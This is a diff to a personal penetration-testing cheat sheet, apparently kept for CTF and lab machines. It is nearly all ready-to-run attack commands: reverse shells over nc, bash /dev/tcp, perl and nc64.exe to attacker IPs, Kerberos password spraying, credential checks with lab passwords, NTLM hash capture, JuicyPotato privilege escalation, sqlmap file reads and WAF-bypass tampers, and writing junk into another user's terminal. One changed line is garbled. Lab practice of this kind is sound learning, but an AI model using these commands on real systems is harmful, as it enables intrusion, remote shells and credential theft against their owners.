@@ -72,7 +72,7 @@ upgrading the reverse shell to proper terminal
 usage: python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 one line reverse shell
-usage: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.31.103 4444 >/tmp/f
+rm usage: /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.31.103 4444 >/tmp/f
 usage: bash -c "bash -i >& /dev/tcp/10.10.14.31/444 0>&1"
 
 python simple http server
@@ -121,7 +121,7 @@ wfuzz: wfuzz -c -f sub-fighter -w /home/kali/Downloads/SecLists-master/Discovery
 
 forwarding a port from attacker machine
 on victim machine: chisel server -p 6004 --reverse &
-on attacker's machine: ./chisel client 10.10.14.10:6004 R:6001:127.0.0.1:8000
+on attacker's machine: ./chisel client 10.10.14.10:6004 R:6001:172.22.0.1:5432
 where 8000 is the port we want to forward, 6004 is the port we are receiving the incoming connection, 6001 is the port which will run the forwarded port on our machine.
 
 sqlmap usage POST Req: sqlmap -u "http://10.129.244.176/index.php" --data="username=saad&password=saad"
@@ -284,6 +284,9 @@ snmpwalk -c public -v2c -On 10.10.11.136
 virtual host or subdomain fuzzing:
 wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb 
 
+subdomain fuzzing using gobuster:
+gobuster vhost -u windcorp.thm -w /home/saad/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 100
+
 perl reverse shell one liner:
 perl -e 'use Socket;$i="10.4.31.103";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
@@ -296,12 +299,109 @@ hex to bytes: bytes_value.hex()
 decrypting rsa with weak public key (when public key and encrypted text is given):
 python3 RsaCtfTool.py --publickey /home/saad/Desktop/hackthebox/challenges/crypto/weak_rsa/key.pub --uncipherfile /home/saad/Desktop/hackthebox/challenges/crypto/weak_rsa/flag.enc
 
-dns name server query:
-dig trick.htb axfr @10.10.11.166
+Starting a local smbserver and transferring files from local to remote:
+on local machine: sudo python3 smbserver.py share . -smb2support 
+on target windows machine: copy \\10.10.14.10\share\winPEAS.exe .
 
-finding subdomains with a specific prefix value using wfuzz:
-sed 's/^/preprod-/' /home/kali/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt > mywordlist 
-wfuzz -c -w ./mywordlist -H "Host: FUZZ.trick.htb" -u 10.10.11.166 -t 100 --hl 83 
+To fuzz a html file in a url:
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.154/FUZZ.html -t 100 --hc 404
 
-sqlmap to read files from the system:
-sqlmap --url "preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --file-read "/var/www/market/index.php" --batch
+kerberos userenum using kerbrute:
+kerbrute userenum -d scrm.local --dc dc1.scrm.local A-ZSurnames.txt
+
+kerbros password bruteforce using kerbrute:
+kerbrute passwordspray -d scrm.local --dc dc1.scrm.local users.txt ksimpson
+
+smb enumeration using smbmap:
+smbmap -u lilyle -p 'ChangeMe#1234' -H windcorp.thm -r
+
+access smb shares with valid username and password:
+smbclient \\\\10.10.82.197\\Users -U WINDCORP/lilyle%"ChangeMe#1234"
+
+downloading a file from smb share:
+smbget -R smb://windcorp.thm/Shared/spark_2_8_3.deb -U lilyle
+
+shellshock vulnerability test:
+env x='() { :;}; echo TEST' ./bash -c :
+(if prints out TEST then vulnerable)
+
+executing a command with printf with some filter bypasses:
+./cmd2 '$(printf "%bbin%bcat %s%s" "\57" "\57" "fl" "ag")'
+
+ldap basic enumeration:
+ldapsearch -H ldap://10.10.10.161 -x -s base '' "(objectClass=*)" "*" +
+
+ldap null-bind:
+
+ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local
+to search for sAMAccounts using ldap:
+ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local "(objectClass=person)" | grep "sAMAccountName:"
+
+to check if a user is part of Remote Management Group:
+ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local | grep -A 11 -i "Remote Management Users"
+net rpc group members 'Privileged IT Accounts' -W 'htb.local' -I '10.10.10.161' -U'svc-alfresco'%'s3rvice' 2>&1
+net rpc group members 'Service Accounts' -W 'htb.local' -I '10.10.10.161' -U'svc-alfresco'%'s3rvice' 2>&1
+
+to see the zip compression method and files crc:
+7z l -slt uploaded-file-3422.zip
+
+to check sudo vulnerable to CVE-2021-3156:
+usage: sudoedit -s '\' $(python3 -c 'print("A"*1000)')
+
+/proc/self/cwd/ points to current working directory
+
+curl to ignore content lenght and not normalize the path
+usage: curl --path-as-is http://10.10.11.164/uploads/..//proc/net/arp --ignore-content-length
+
+using ping to check blind rce:
+usage: ping -c 20 127.0.0.1
+This will ping for 20 counts and server will respond late.
+
+Finding multipe files in linux at the same time using find command:
+find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) 2>/dev/null
+
+Login to postgresql with cmd:
+psql -h 127.0.0.1 -p 6001 -Upostgres -W -d mentorquotes_db
+
+to list down nfs shares:
+usage: showmount -e squashed.htb
+
+to mount nfs shares:
+usage: sudo mount -t nfs squashed.htb:/var/www/html /mnt/
+
+adding junk to someone else's terminal
+usage: cat /dev/urandom > /dev/pts/9
+
+sqlmap tamper scripts:
+usage: --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+
+
+MD5 crack with salt in hashcat:
+usage: hashcat -m 20 john.hashes /home/kali/Documents/wordlists/rockyou.txt
+
+parameter fuzzing with wfuzz for lfi or rfi
+usage: wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://school.flight.htb/index.php?FUZZ=index.php" -t 100 --hh 3996
+
+
+Checking credentials validity with crackmapexec
+usage: crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13'
+
+
+Listing users with crackmapexec valid creds:
+crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users
+
+Checking the same password on multiple users with crackmapexec
+usage: crackmapexec smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success 
+
+Starting a smb server with impacket to capture the ntlmv2 hash
+usage: sudo impacket-smbserver parrotsec . -smb2support
+
+JuicyPotato to exploit SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege priv esc in windows
+usage: .\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -i
+
+nmap quick all port scan:
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.176 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sC -sV 10.10.11.176
+
+windows rev shell with nc64.exe:
+nc64.exe -e cmd.exe 10.10.14.43 4444
